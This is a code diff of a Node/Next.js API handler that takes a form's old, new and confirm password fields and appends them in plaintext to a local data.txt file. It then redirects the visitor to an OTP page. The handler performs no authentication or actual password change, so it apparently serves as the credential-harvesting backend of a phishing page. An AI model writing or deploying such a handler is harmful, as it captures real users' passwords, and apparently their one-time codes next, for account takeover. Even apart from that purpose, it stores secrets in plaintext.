@@ -1,16 +1,34 @@
 import fs from 'fs';
 import path from 'path';
 
+export const config = {
+  api: {
+    bodyParser: false, // turn off default body parser
+  },
+};
+
 export default async function handler(req, res) {
   if (req.method === 'POST') {
-    const { oldpass, newpass, confirmpass } = req.body;
+    let body = '';
 
-    const log = `Old Password: ${oldpass}\nNew Password: ${newpass}\nConfirm Password: ${confirmpass}\n\n`;
-    const filePath = path.join(process.cwd(), 'data', 'data.txt');
+    req.on('data', chunk => {
+      body += chunk.toString();
+    });
 
-    fs.appendFileSync(filePath, log, 'utf8');
+    req.on('end', () => {
+      const parsed = new URLSearchParams(body);
+      const oldpass = parsed.get('oldpass');
+      const newpass = parsed.get('newpass');
+      const confirmpass = parsed.get('confirmpass');
 
-    res.redirect(307, '/otp'); // Redirect to OTP page
+      const log = `Old: ${oldpass}\nNew: ${newpass}\nConfirm: ${confirmpass}\n\n`;
+
+      const filePath = path.join(process.cwd(), 'data.txt');
+      fs.appendFileSync(filePath, log, 'utf8');
+
+      res.writeHead(302, { Location: '/otp.html' });
+      res.end();
+    });
   } else {
     res.status(405).send('Method Not Allowed');
   }
